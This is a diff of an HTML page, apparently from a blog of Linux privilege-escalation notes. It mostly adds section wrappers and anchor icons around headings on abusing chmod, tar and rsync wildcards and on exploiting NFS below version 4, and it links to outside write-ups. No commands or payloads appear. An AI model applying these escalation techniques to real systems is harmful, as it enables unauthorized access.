 	return 0;
 }
 </code></pre>
-<h2 id="abusing-wildcards">Abusing wildcards</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="abusing-wildcards">
+
+
+<h2 class="header-anchor-wrapper">Abusing wildcards
+  <a href="#abusing-wildcards" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <p>Check out this fantastic <a href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">document</a> of a talk</p>
 <ul>
 <li>Abusing <code>chmod</code></li>
@@ -796,9 +1074,33 @@ int main(int argc, const char * argv[]){
 <li>Abusing <code>tar</code></li>
 <li>Abusing <code>rsync</code></li>
 </ul>
-<h2 id="abusing-nfs--4">Abusing NFS &lt; 4</h2>
-<p>Refer to my <a href="https://www.notion.so/NFS-4-689ff63036654c3f8e3bda2deef9f6e5">personal notes</a> for exploiting NFS &lt; 4</p>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="abusing-nfs--4">
 
+
+<h2 class="header-anchor-wrapper">Abusing NFS &lt; 4
+  <a href="#abusing-nfs--4" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
+<p>Refer to my <a href="https://www.notion.so/NFS-4-689ff63036654c3f8e3bda2deef9f6e5">personal notes</a> for exploiting NFS &lt; 4</p>
+</section>
+    
 </article>
 </div>
 
@@ -828,11 +1130,13 @@ int main(int argc, const char * argv[]){
 </div>
 
                 
+
+                
             </div>
+        </main>
 <footer>
     <article>Made with love...and copious amounts of coffee</article>
 </footer>
 
-</main>
-    </body>
+</body>
 </html>
